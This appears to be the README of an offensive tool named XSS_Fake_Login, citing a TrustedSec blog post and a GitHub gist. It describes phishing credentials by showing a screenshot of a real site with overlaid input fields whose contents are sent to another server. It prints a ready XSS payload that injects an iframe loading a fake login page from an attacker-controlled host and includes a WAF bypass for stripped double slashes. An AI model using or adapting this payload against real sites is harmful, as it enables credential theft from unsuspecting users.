# XSS_Fake_Login

Based on https://trustedsec.com/blog/scraping-login-credentials-with-xss and https://gist.github.com/hoodoer/f58ac94755ba2faf5d971d4350a580ed

Instead of display the original website in an iframe, we only display a screenshot of the original website and overlay the form/input fields. Those will be exfiltrated to another server.

Payload for XSS in url could be:

Note this already includes a bypass for the waf, which stripped out double / (//)
```
<iframe id="search" src="" allow="fullscreen" align="left" width="2048" height="1600" frameborder="0"></iframe><script>let getInput = "/attacker.webserver/login.html";var address;address = "https:/"+getInput;document.getElementById('search').src = address;</script>
```
The Code for the login.html is in this repo
